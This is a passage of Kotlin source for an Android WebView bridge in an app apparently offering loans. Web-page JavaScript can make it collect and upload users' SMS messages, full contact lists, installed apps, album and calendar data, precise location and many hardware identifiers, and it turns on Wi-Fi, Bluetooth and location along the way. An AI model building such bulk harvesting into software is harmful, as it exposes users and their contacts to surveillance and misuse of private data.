package com.fly.ayudaconfiable.js

import android.annotation.SuppressLint
import android.app.Activity
import android.content.*
import android.database.Cursor
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.SystemClock
import android.provider.ContactsContract
import android.text.TextUtils
import android.util.Base64
import android.webkit.JavascriptInterface
import android.webkit.WebView
import androidx.annotation.Keep
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.FragmentActivity
import androidx.lifecycle.ViewModelStoreOwner
import com.blankj.utilcode.util.DeviceUtils
import com.fly.ayudaconfiable.MyApplication
import com.fly.ayudaconfiable.activity.BaseWebActivity
import com.fly.ayudaconfiable.activity.StartActivity
import com.fly.ayudaconfiable.bean.*
import com.fly.ayudaconfiable.bean.event.HttpEvent
import com.fly.ayudaconfiable.js.bean.AppJSBean
import com.fly.ayudaconfiable.js.bean.CommentParseDataBean
import com.fly.ayudaconfiable.utils.*
import com.google.gson.Gson
import com.hjq.permissions.OnPermissionCallback
import com.hjq.permissions.Permission
import com.hjq.permissions.XXPermissions
import com.liveness.dflivenesslibrary.DFTransferResultInterface
import com.liveness.dflivenesslibrary.liveness.DFActionLivenessActivity
import com.liveness.dflivenesslibrary.liveness.util.Constants
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

/**
 * 桥接
 */

@Keep
class AndroidJS constructor(webView: WebView, viewModelStoreOwner: ViewModelStoreOwner) {
    val APP_CLIENT = "moxiAndroid"
    private var mWebView: WebView
    private var mViewModelStoreOwner: ViewModelStoreOwner
    private var photoFile: File? = null
    private var eventTackPhotoId: String = ""
    private var eventTackPhotoType: String = ""
    private var eventSelectContactId: String = ""
    private var eventVivoContactId: String = ""

    init {
        mWebView = webView;
        mViewModelStoreOwner = viewModelStoreOwner
    }

    @JavascriptInterface
    fun moxiJS(json: String) {
        LogUtils.d("js调用app:$json")
        val model: AppJSBean = Gson().fromJson(json, AppJSBean::class.java)
        parseData(model.data, model.shijian, model.id)
    }

    fun parseData(data: Any?, event: String, id: String) {
        when (event) {
            Cons.JS_KEY_COPY -> copy(id, data)
            Cons.JS_KEY_USER_INFO -> getUserInfo(id)
            Cons.JS_KEY_LOGOUT -> logout(id)
            Cons.JS_KEY_CONTACT_INFO -> eventContactInfo(id)
            Cons.JS_KEY_DEVICE_INFO -> evenDeviceInfo(id)
            Cons.JS_KEY_LOCATION_INFO -> eventLocationInfo(id)
            Cons.JS_KEY_INSTALLATION_INFO -> eventInstallationInfo(id)
            Cons.JS_KEY_SMS_INFO -> eventSmsInfo(id)
            Cons.JS_KEY_TACK_PHOTO -> eventTackPhoto(id, data)
            Cons.JS_KEY_ALBUM_PHOTO -> eventAlbumInfo(id)
            Cons.JS_KEY_CALENDERS_PHOTO -> eventCalendersInfo(id)
            Cons.JS_KEY_SELECT_CONTACT -> eventSelectContact(id)
            Cons.JS_KEY_CALL_PHONE -> eventCallPhone(id, data)
            Cons.JS_KEY_APPS_FLYER -> eventAppsFlyer(id, data)
            Cons.JS_KEY_NEW_VIEW -> eventNewView(id, data)
            Cons.JS_KEY_SERVICE_TIME -> eventServiceTime(id, data)
            Cons.JS_KEY_VIVO -> eventVivo(id, data)
            Cons.JS_KEY_FLY_SD_TIME, Cons.JS_KEY_FLY_SSD_TIME, Cons.JS_KEY_FLY_FEW_TIME, Cons.JS_KEY_FLY_WEWE_TIME, Cons.JS_KEY_FLY_EWWW_TIME, Cons.JS_KEY_FLY_TIME -> evenDeviceInfo(
                id
            )
        }
    }

    /**
     * 活体检测
     */
    private fun eventVivo(id: String, data: Any?) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.Group.STORAGE)
            .permission(Permission.CAMERA)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        eventVivoContactId = id
                        val bundle = Bundle()
                        bundle.putString(DFActionLivenessActivity.OUTTYPE, Constants.MULTIIMG);
                        bundle.putString(DFActionLivenessActivity.EXTRA_MOTION_SEQUENCE, "STILL BLINK MOUTH NOD YAW");
                        bundle.putString(
                            DFActionLivenessActivity.EXTRA_RESULT_PATH,
                            CommonUtil.getImageDir()
                        )
                        var intent = Intent();
                        ActivityManager.getCurrentActivity()
                            ?.let { intent.setClass(it, DFActionLivenessActivity::class.java) }
                        intent.putExtras(bundle);
                        intent.putExtra(DFActionLivenessActivity.KEY_DETECT_IMAGE_RESULT, true);
                        intent.putExtra(DFActionLivenessActivity.KEY_HINT_MESSAGE_HAS_FACE, "Please hold still");
                        intent.putExtra(DFActionLivenessActivity.KEY_HINT_MESSAGE_NO_FACE, "Please place your face inside the circle");
                        intent.putExtra(DFActionLivenessActivity.KEY_HINT_MESSAGE_FACE_NOT_VALID, "Please move away from the screen");
                        ActivityManager.getCurrentActivity()?.startActivityForResult(intent,
                            Cons.KEY_TO_DETECT_REQUEST_CODE
                        );
                    } else {
                        AndroidCallBackJS.callbackJsErrorOther(
                            mWebView,
                            id,
                            Cons.JS_KEY_VIVO,
                            "Los parámetros son incorrectos."
                        )
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id, Cons.JS_KEY_VIVO)
                }
            })

    }

    private fun eventServiceTime(id: String, data: Any?) {
        try {
            var commentParseDataBean =
                Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            val time: String = commentParseDataBean.value
            DateTool.initTime(time)
        } catch (e: Exception) {
            e.printStackTrace()
            AndroidCallBackJS.callbackJsErrorOther(
                mWebView,
                id,
                Cons.JS_KEY_SERVICE_TIME,
                "Los parámetros son incorrectos."
            )
        }
    }

    /**
     * 选择通讯录
     */
    private fun eventSelectContact(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.READ_CONTACTS)
            .permission(Permission.GET_ACCOUNTS)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: List<String>, all: Boolean) {
                    if (all) {
                        eventSelectContactId = id
                        ActivityManager.getCurrentActivity()?.startActivityForResult(
                            Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI),
                            Cons.SELECT_CONTACTS_CONTRACT
                        )
                    } else {
                        AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id,
                            Cons.JS_KEY_SELECT_CONTACT
                        )
                    }
                }

                override fun onDenied(permissions: List<String>, never: Boolean) {
                    AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id, Cons.JS_KEY_SELECT_CONTACT)
                }
            })
    }

    /**
     *打电话
     */
    private fun eventCallPhone(id: String, data: Any?) {
        try {
            var commentParseDataBean =
                Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            val phone: String = commentParseDataBean.value
            val intent = Intent(Intent.ACTION_DIAL, Uri.parse("tel:$phone"))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            MyApplication.application.startActivity(intent)
            AndroidCallBackJS.callBackJsSuccess(mWebView, id, Cons.JS_KEY_CALL_PHONE)
        } catch (e: Exception) {
            e.printStackTrace()
            AndroidCallBackJS.callbackJsErrorOther(
                mWebView,
                id,
                Cons.JS_KEY_CALL_PHONE,
                "Los parámetros son incorrectos."
            )
        }
    }

    /**
     * 埋点
     */
    private fun eventAppsFlyer(id: String, data: Any?) {
        try {
            var commentParseDataBean =
                Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            AppsFlyerUtil.postAF(commentParseDataBean.value)
            AndroidCallBackJS.callBackJsSuccess(mWebView, id, Cons.JS_KEY_APPS_FLYER)
        } catch (e: Exception) {
            e.printStackTrace()
            AndroidCallBackJS.callbackJsErrorOther(
                mWebView,
                id,
                Cons.JS_KEY_APPS_FLYER,
                "Los parámetros son incorrectos."
            )
        }
    }

    /**
     * 跳转新的页面
     */
    private fun eventNewView(id: String, data: Any?) {
        try {
            var commentParseDataBean =
                Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            BaseWebActivity.openWebView(
                ActivityManager.getCurrentActivity() as AppCompatActivity,
                commentParseDataBean.value,
                false
            )
        } catch (e: Exception) {
            e.printStackTrace()
            AndroidCallBackJS.callbackJsErrorOther(
                mWebView,
                id,
                Cons.JS_KEY_NEW_VIEW,
                "Los parámetros son incorrectos."
            )
        }
    }


    /**
     * 复制
     */
    private fun copy(id: String, data: Any?) {
        try {
            var commentParseDataBean =
                Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            val clipboardManager =
                MyApplication.application.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clipData = ClipData.newPlainText("Label", commentParseDataBean.value)
            clipboardManager.setPrimaryClip(clipData)
            AndroidCallBackJS.callBackJsSuccess(mWebView, id, Cons.JS_KEY_COPY)
        } catch (e: Exception) {
            e.printStackTrace()
            AndroidCallBackJS.callbackJsErrorOther(
                mWebView,
                id,
                Cons.JS_KEY_COPY,
                "Los parámetros son incorrectos."
            )
        }
    }

    /**
     * 获取用户信息
     */
    private fun getUserInfo(id: String) {
        AndroidCallBackJS.callBackJsSuccess(
            mWebView,
            id,
            Cons.JS_KEY_USER_INFO,
            UserInfoManger.getUserInfoJson()
        )
    }

    /**
     * 退出登录
     */
    private fun logout(id: String) {
        UserInfoManger.logout()
        AndroidCallBackJS.callBackJsSuccess(mWebView, id, Cons.JS_KEY_LOGOUT)
        val intent = Intent(ActivityManager.getCurrentActivity(), StartActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK)
        ActivityManager.getCurrentActivity()?.startActivity(intent)
    }

    /**
     * 通讯录信息
     */
    private fun eventContactInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.READ_CONTACTS)
            .permission(Permission.GET_ACCOUNTS).request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        GlobalScope.launch(Dispatchers.IO) {
                            var contactInfoBeans = ContactUtil.getContactInfoList()
                            withContext(Dispatchers.Main) {
                                var applyInfoBean = ApplyInfo()
                                applyInfoBean.phonebook_info = contactInfoBeans
                                HttpEvent.uploadApplyInfo(
                                    applyInfoBean,
                                    mWebView,
                                    id,
                                    Cons.JS_KEY_CONTACT_INFO
                                )
                                if (contactInfoBeans != null) {
                                    LogUtils.d("通讯录：${contactInfoBeans.toString()}")
                                }
                            }
                        }
                    } else {
                        AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id,
                            Cons.JS_KEY_CONTACT_INFO
                        )
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id, Cons.JS_KEY_CONTACT_INFO)
                }
            })
    }

    /**
     * 设备信息
     */
    private fun evenDeviceInfo(id: String) {
        DeviceInfoUtil.openLocService()
        DeviceInfoUtil.openWifi()
        DeviceInfoUtil.openBluetooth()
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.ACCESS_FINE_LOCATION)
            .permission(Permission.ACCESS_COARSE_LOCATION)
            .permission(Permission.READ_PHONE_STATE)
            .permission(Permission.Group.BLUETOOTH)
            .permission(Permission.Group.STORAGE)
            .permission(Permission.READ_CONTACTS)
            .permission(Permission.GET_ACCOUNTS)
            .request(object : OnPermissionCallback {
                @SuppressLint("MissingPermission")
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        LocationUtil.initLocationListener()
                        var blue = true
                        if (DeviceInfoUtil.isHaveBluetooth()){
                            blue = DeviceInfoUtil.isOpenBluetooth()
                        }
                        if (!DeviceInfoUtil.isLocServiceEnable() || !DeviceInfoUtil.isOpenWifi() || !blue) {
                            return
                        }
                        GlobalScope.launch(Dispatchers.IO) {
                            LogUtils.d("需要等待ip,开启WiFi后需要等待一段时间才可进行抓取")
                            Thread.sleep(3000)
                            var batteryBean = BatteryUtil.getBatteryBean()
                            var deviceInfoBean = DeviceInfo()
                            deviceInfoBean.regWifiAddress =
                                DeviceInfoUtil.regWifiAddress().toString()
                            deviceInfoBean.wifiList = DeviceInfoUtil.getWifiList()
                            deviceInfoBean.imei = DeviceInfoUtil.getIMEI()
                            deviceInfoBean.imsi = DeviceInfoUtil.getAndroidID().toString()
                            deviceInfoBean.phoneModel = Build.MODEL
                            deviceInfoBean.phoneVersion = Build.VERSION.SDK_INT.toString()
                            deviceInfoBean.macAddress = DeviceUtils.getMacAddress()
                            deviceInfoBean.availableSpace = DeviceInfoUtil.getAvailableSpace()
                            deviceInfoBean.sensorCount = DeviceInfoUtil.getSensorCount()
                            deviceInfoBean.totalRam = DeviceInfoUtil.getTotalRam()
                            deviceInfoBean.deviceName = DeviceInfoUtil.getDeviceName().toString()
                            deviceInfoBean.isRooted = if (DeviceUtils.isDeviceRooted()) {
                                "1"
                            } else {
                                "0"
                            }
                            deviceInfoBean.basebandVer = DeviceInfoUtil.getBasebandVersion()
                            deviceInfoBean.screenResolution =
                                DeviceInfoUtil.getScreenResolution().toString()
                            deviceInfoBean.ip = DeviceInfoUtil.getIPAddress().toString()
                            deviceInfoBean.deviceCreateTime = DateTool.getTimeFromLong(
                                DateTool.FMT_DATE_TIME,
                                DateTool.getServerTimestamp()
                            ).toString()
                            deviceInfoBean.battery_temper =
                                CommonUtil.stringToInt(batteryBean.temperature)
                            deviceInfoBean.cores = Runtime.getRuntime().availableProcessors()
                            deviceInfoBean.app_max_memory =
                                DeviceInfoUtil.getTotalMemory().toString()
                            deviceInfoBean.app_free_memory =
                                DeviceInfoUtil.getAvailMemory().toString()
                            deviceInfoBean.update_mills = SystemClock.uptimeMillis()
                            deviceInfoBean.elapsed_realtime = SystemClock.elapsedRealtime()
                            deviceInfoBean.network_type =
                                NetUtils.getNetWorkStateName(MyApplication.application)
                            deviceInfoBean.is_simulator = if (DeviceUtils.isEmulator()) {
                                1
                            } else {
                                0
                            }
                            deviceInfoBean.android_id = DeviceInfoUtil.getAndroidID().toString()
                            deviceInfoBean.time_zone_id = DeviceInfoUtil.getTimeZoneId().toString()
                            deviceInfoBean.battery = batteryBean
                            deviceInfoBean.locale_ios3_country =
                                DeviceInfoUtil.getLocaleIos3Country().toString()
                            deviceInfoBean.locale_display_language =
                                DeviceInfoUtil.getLocaleIos3Language().toString()
                            deviceInfoBean.gaid = DeviceInfoUtil.getGAID().toString()
                            deviceInfoBean.wifi_ssid = DeviceInfoUtil.regWifiSSID().toString()
                            deviceInfoBean.wifi_mac = deviceInfoBean.regWifiAddress
                            deviceInfoBean.longitude =
                                LocationUtil.getLocation()?.longitude.toString()
                            deviceInfoBean.latitude =
                                LocationUtil.getLocation()?.latitude.toString()
                            deviceInfoBean.sdk_public_ip = PublicIP.getIp().toString()
                            deviceInfoBean.isUsingProxyPort = if (DeviceInfoUtil.isWifiProxy()) {
                                "true"
                            } else {
                                "false"
                            }
                            deviceInfoBean.isUsingVPN = if (DeviceInfoUtil.checkVPN()) {
                                "true"
                            } else {
                                "false"
                            }
                            deviceInfoBean.isUSBDebug = if (DeviceInfoUtil.checkUsbStatus()) {
                                "true"
                            } else {
                                "false"
                            }
                            deviceInfoBean.bluetooth_saved =
                                DeviceInfoUtil.fetchAlReadyConnection().toString()
                            deviceInfoBean.sensorList = DeviceInfoUtil.getSensorBeanList()
                            deviceInfoBean.phone_type = DeviceInfoUtil.getPhoneType()
                            deviceInfoBean.language = DeviceInfoUtil.getLanguage().toString()
                            deviceInfoBean.network_operator_name =
                                NetUtils.getOperatorName().toString()
                            deviceInfoBean.locale_iso_3_language =
                                DeviceInfoUtil.getLocaleIos3Country().toString()
                            deviceInfoBean.build_fingerprint = Build.FINGERPRINT
                            deviceInfoBean.cur_wifi_ssid = DeviceInfoUtil.regWifiSSID().toString()
                            deviceInfoBean.DownloadFiles = FileUtil.getDownloadFile().size
                            deviceInfoBean.battery_status = batteryBean.status
                            deviceInfoBean.is_usb_charge =
                                if (batteryBean.plugged == BatteryManager.BATTERY_PLUGGED_USB) {
                                    1
                                } else {
                                    0
                                }
                            deviceInfoBean.is_ac_charge =
                                if (batteryBean.plugged == BatteryManager.BATTERY_PLUGGED_AC) {
                                    1
                                } else {
                                    0
                                }
                            deviceInfoBean.AudioInternal = FileUtil.getAudioInternal().size
                            deviceInfoBean.nettype =
                                NetUtils.getNetworkState1(MyApplication.application).toString()
                            deviceInfoBean.iccid1 = DeviceInfoUtil.getICCID1().toString()
                            deviceInfoBean.serial = Build.SERIAL
                            deviceInfoBean.kernel_architecture = Build.CPU_ABI
                            deviceInfoBean.build_id = Build.ID
                            deviceInfoBean.ImagesInternal = FileUtil.getImagesInternal().size
                            deviceInfoBean.build_number = Build.DISPLAY
                            deviceInfoBean.ContactGroup =
                                ContactUtil.getContactGroup().size.toString()
                            deviceInfoBean.gsfid = DeviceInfoUtil.getGsfAndroidId().toString()
                            deviceInfoBean.board = Build.BOARD
                            deviceInfoBean.VideoInternal = FileUtil.getVideoInternal().size
                            deviceInfoBean.AudioExternal = FileUtil.getAudioExternal().size
                            deviceInfoBean.build_time =
                                DateTool.getTimeFromLong(DateTool.FMT_DATE_TIME1, Build.TIME)
                                    .toString()
                            deviceInfoBean.wifiCount = deviceInfoBean.wifiList!!.size
                            deviceInfoBean.time_zone = DeviceInfoUtil.getTimeZone().toString()
                            deviceInfoBean.release_date =
                                DateTool.getTimeFromLong(DateTool.FMT_DATE_TIME1, Build.TIME)
                                    .toString()
                            deviceInfoBean.iccid2 = DeviceInfoUtil.getICCID2().toString()
                            deviceInfoBean.meid = DeviceInfoUtil.getMeidOnly().toString()
                            deviceInfoBean.ImagesExternal = FileUtil.getImagesExternal().size
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                deviceInfoBean.security_patch_level = Build.VERSION.SECURITY_PATCH
                            }
                            deviceInfoBean.API_level = Build.VERSION.SDK_INT.toString()

                            withContext(Dispatchers.Main) {
                                val applyInfoBean = ApplyInfo()
                                val deviceInfoBeans = ArrayList<DeviceInfo>()
                                deviceInfoBeans.add(deviceInfoBean)
                                applyInfoBean.device_info = deviceInfoBeans
                                HttpEvent.uploadApplyInfo(
                                    applyInfoBean,
                                    mWebView,
                                    id,
                                    Cons.JS_KEY_DEVICE_INFO
                                )
                                LogUtils.d("设备信息：${deviceInfoBean}")
                            }
                        }
                    } else {
                        AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id, Cons.JS_KEY_DEVICE_INFO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id, Cons.JS_KEY_DEVICE_INFO)
                }
            })
    }

    /**
     * 位置信息
     */
    private fun eventLocationInfo(id: String) {
        DeviceInfoUtil.openLocService()
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.ACCESS_FINE_LOCATION)
            .permission(Permission.ACCESS_COARSE_LOCATION)
            .permission(Permission.READ_PHONE_STATE)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        LocationUtil.initLocationListener()
                        if (!DeviceInfoUtil.isLocServiceEnable()) {
                            AndroidCallBackJS.callbackJsErrorPermissions(
                                mWebView,
                                id,
                                Cons.JS_KEY_LOCATION_INFO
                            )
                            return
                        }
                        GlobalScope.launch(Dispatchers.IO) {
                            var locationBean = LocationInfo()
                            var location = LocationUtil.getLocation()
                            if (location == null) {
                                Thread.sleep(5000L)
                            }
                            locationBean.geo_time = DateTool.getTimeFromLong(
                                DateTool.FMT_DATE_TIME,
                                DateTool.getServerTimestamp()
                            ).toString()
                            if (location != null) {
                                locationBean.latitude = location.latitude.toString()
                                locationBean.longtitude = location.longitude.toString()
                                val address =
                                    LocationUtil.getAddress(location.latitude, location.longitude)
                                if (address != null) {
                                    locationBean.gps_address_province = address.adminArea
                                    locationBean.gps_address_city = address.locality
                                    if (TextUtils.isEmpty(address.featureName)) {
                                        address.featureName = address.getAddressLine(0)
                                    }
                                    if (TextUtils.isEmpty(address.featureName)) {
                                        address.featureName = address.subAdminArea
                                    }
                                    if (TextUtils.isEmpty(address.featureName)) {
                                        address.featureName = address.thoroughfare
                                    }
                                    if (TextUtils.isEmpty(address.thoroughfare)) {
                                        address.thoroughfare = address.featureName
                                    }
                                    locationBean.gps_address_street = address.thoroughfare
                                    locationBean.location = address.featureName
                                }
                            }
                            withContext(Dispatchers.Main) {
                                LogUtils.d("位置信息：${locationBean}")
                                var applyInfoBean = ApplyInfo()
                                val locationBeans = ArrayList<LocationInfo>()
                                locationBeans.add(locationBean)
                                applyInfoBean.geo_info = locationBeans
                                HttpEvent.uploadApplyInfo(
                                    applyInfoBean,
                                    mWebView,
                                    id,
                                    Cons.JS_KEY_LOCATION_INFO
                                )
                            }
                        }
                    } else {
                        AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id,
                            Cons.JS_KEY_LOCATION_INFO
                        )
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id, Cons.JS_KEY_LOCATION_INFO)
                }
            })
    }

    /**
     * 安装信息
     */
    private fun eventInstallationInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.READ_PHONE_STATE)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        GlobalScope.launch(Dispatchers.IO) {
                            var apps = InstallationUtil.getInstallationInfos()
                            withContext(Dispatchers.Main) {
                                LogUtils.d("安装信息：${apps}")
                                var applyInfoBean = ApplyInfo()
                                applyInfoBean.applist_info = apps
                                HttpEvent.uploadApplyInfo(
                                    applyInfoBean,
                                    mWebView,
                                    id,
                                    Cons.JS_KEY_INSTALLATION_INFO
                                )
                            }
                        }
                    } else {
                        AndroidCallBackJS.callbackJsErrorPermissions(
                            mWebView,
                            id,
                            Cons.JS_KEY_INSTALLATION_INFO
                        )
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id,
                        Cons.JS_KEY_INSTALLATION_INFO
                    )
                }
            })
    }

    /**
     * 短信信息
     */
    private fun eventSmsInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.READ_PHONE_STATE)
            .permission(Permission.READ_SMS)
            .permission(Permission.READ_CONTACTS)
            .permission(Permission.GET_ACCOUNTS)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        GlobalScope.launch(Dispatchers.IO) {
                            var smss = SmsUtil.getSmsList()
                            withContext(Dispatchers.Main) {
                                LogUtils.d("短信信息：${smss}")
                                var applyInfoBean = ApplyInfo()
                                applyInfoBean.sms_info = smss
                                HttpEvent.uploadApplyInfo(
                                    applyInfoBean,
                                    mWebView,
                                    id,
                                    Cons.JS_KEY_SMS_INFO
                                )
                            }
                        }
                    } else {
                        AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id, Cons.JS_KEY_SMS_INFO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id, Cons.JS_KEY_SMS_INFO)
                }
            })
    }

    /**
     * 拍照上传
     */
    private fun eventTackPhoto(id: String, data: Any?) {
        try {
            var commentParseDataBean =
                Gson().fromJson(data.toString(), CommentParseDataBean::class.java)
            eventTackPhotoType = commentParseDataBean.value
            XXPermissions.with(ActivityManager.getCurrentActivity())
                .permission(Permission.Group.STORAGE)
                .permission(Permission.CAMERA)
                .request(object : OnPermissionCallback {
                    override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                        if (all) {
                            eventTackPhotoId = id
                            photoFile = CommonUtil.tackPhoto()
                        } else {
                            AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id,
                                Cons.JS_KEY_TACK_PHOTO
                            )
                        }
                    }

                    override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                        AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id, Cons.JS_KEY_TACK_PHOTO)
                    }
                })
        } catch (e: Exception) {
            e.printStackTrace()
            AndroidCallBackJS.callbackJsErrorOther(
                mWebView,
                id,
                Cons.JS_KEY_CALL_PHONE,
                "Los parámetros son incorrectos."
            )
        }

    }

    var imageDataSource = ImageDataSource()

    /**
     * 相册信息
     */
    private fun eventAlbumInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.Group.STORAGE)
            .permission(Permission.READ_PHONE_STATE)
            .permission(Permission.ACCESS_MEDIA_LOCATION)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        imageDataSource.setOnImageLoadListener(object :
                            ImageDataSource.OnImageLoadListener {
                            override fun onImageLoad(imageFolders: ArrayList<AlbumInfo>) {
                                imageDataSource.unOnImageLoadListener()
                                GlobalScope.launch(Dispatchers.IO) {
                                    var albumInfoBeans = imageFolders
                                    LogUtils.d("相册信息：${albumInfoBeans.size}+${albumInfoBeans}")
                                    withContext(Dispatchers.Main) {
                                        var applyInfoBean = ApplyInfo()
                                        applyInfoBean.album_info = albumInfoBeans
                                        HttpEvent.uploadApplyInfo(
                                            applyInfoBean,
                                            mWebView,
                                            id,
                                            Cons.JS_KEY_ALBUM_PHOTO
                                        )
                                    }
                                }
                            }
                        })
                        GlobalScope.launch(Dispatchers.Main) {
                            imageDataSource.load(ActivityManager.getCurrentActivity() as FragmentActivity)
                        }
                    } else {
                        AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id, Cons.JS_KEY_ALBUM_PHOTO)
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id, Cons.JS_KEY_ALBUM_PHOTO)
                }
            })
    }

    /**
     * 日历信息
     */
    private fun eventCalendersInfo(id: String) {
        XXPermissions.with(ActivityManager.getCurrentActivity())
            .permission(Permission.Group.CALENDAR)
            .request(object : OnPermissionCallback {
                override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                    if (all) {
                        GlobalScope.launch(Dispatchers.IO) {
                            var calendersInfoBeans = CalendersUtil.getCalendersList()
                            LogUtils.d("日历信息：${calendersInfoBeans}")
                            withContext(Dispatchers.Main) {
                                var applyInfoBean = ApplyInfo()
                                applyInfoBean.calenders_info = calendersInfoBeans
                                HttpEvent.uploadApplyInfo(
                                    applyInfoBean,
                                    mWebView,
                                    id,
                                    Cons.JS_KEY_CALENDERS_PHOTO
                                )
                            }
                        }
                    } else {
                        AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id,
                            Cons.JS_KEY_CALENDERS_PHOTO
                        )
                    }
                }

                override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                    AndroidCallBackJS.callbackJsErrorPermissions(mWebView, id, Cons.JS_KEY_CALENDERS_PHOTO)
                }
            })
    }

    fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == Cons.TACK_PHOTO) {
            if (resultCode == Activity.RESULT_OK) {
                //自拍信息
                LoadingUtil.showLoading()
                GlobalScope.launch(Dispatchers.IO) {
                    var file: File? = null
                    photoFile?.let {
                        LogUtils.d("压缩前：" + it.length())
                        file = ImageUtils.compressImage(it.absolutePath)
                        LogUtils.d("压缩后：" + (file?.length() ?: "0"))
                    }
                    withContext(Dispatchers.Main) {
                        if (file == null) {
                            AndroidCallBackJS.callbackJsErrorOther(
                                mWebView,
                                eventTackPhotoId,
                                Cons.JS_KEY_TACK_PHOTO,
                                "La carga de la imagen falló."
                            )
                        }
                        file?.let {
                            HttpEvent.uploadImage(
                                it,
                                eventTackPhotoType,
                                mWebView,
                                eventTackPhotoId,
                                Cons.JS_KEY_TACK_PHOTO
                            )
                            if (file!!.name == null) {
                                HttpEvent.uploadImage(
                                    it,
                                    eventTackPhotoType,
                                    mWebView,
                                    eventTackPhotoId,
                                    Cons.JS_KEY_TACK_PHOTO,
                                    ""
                                )
                            }
                        }
                    }
                }
            } else {
                AndroidCallBackJS.callbackJsErrorOther(
                    mWebView,
                    eventTackPhotoId,
                    Cons.JS_KEY_TACK_PHOTO,
                    "Ninguno."
                )
            }
        } else if (requestCode == Cons.SELECT_CONTACTS_CONTRACT) {
            if (resultCode == Activity.RESULT_OK) {
                val contactBean = ContactInfo()
                if (data == null || data.data == null) {
                    AndroidCallBackJS.callbackJsErrorOther(
                        mWebView,
                        eventSelectContactId,
                        Cons.JS_KEY_SELECT_CONTACT,
                        "Ninguno"
                    )
                    return
                }
                var cursor: Cursor? = null
                var phone: Cursor? = null
                try {
                    val reContentResolverol: ContentResolver =
                        MyApplication.application.contentResolver
                    cursor = reContentResolverol.query(data.data!!, null, null, null, null)
                    cursor?.let {
                        it.moveToFirst()
                        contactBean.name =
                            it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                        // 条件为联系人ID
                        val contactId =
                            it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                        // 获得DATA表中的电话号码，条件为联系人ID,因为手机号码可能会有多个
                        phone = reContentResolverol.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId,
                            null,
                            null
                        )
                        phone?.let { p ->
                            while (p.moveToNext()) {
                                contactBean.mobile =
                                    p.getString(p.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                            }
                        }
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                } finally {
                    phone?.close()
